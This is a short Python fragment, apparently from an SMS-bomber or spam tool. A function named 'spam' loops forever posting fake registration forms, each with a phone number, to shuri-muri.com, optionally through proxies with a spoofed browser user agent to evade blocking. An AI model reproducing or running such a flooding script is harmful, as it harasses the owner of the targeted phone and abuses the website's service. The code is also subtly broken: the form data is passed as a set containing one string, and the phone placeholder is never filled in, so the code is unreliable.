    ...
    def main(self):
        ...
        def spam(thread_name='0', proxy=None):
            ...
            while True:
                try:
                    if proxy == None:
                        r = requests.post('http://shuri-muri.com/registration/', data={'fname=eduard&sname=snow&day=29&month=11&year=1996&gender=1&country=3159&region=4312&city=4400&phone=%2B" telephone "&rools=1'})
                    else:
                        r = requests.post('http://shuri-muri.com/registration/', data={'fname=eduard&sname=snow&day=29&month=11&year=1996&gender=1&country=3159&region=4312&city=4400&phone=%2B" telephone "&rools=1': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/56.0.3051.104'}, proxies={'http': str(proxy), 'https': str(proxy)})
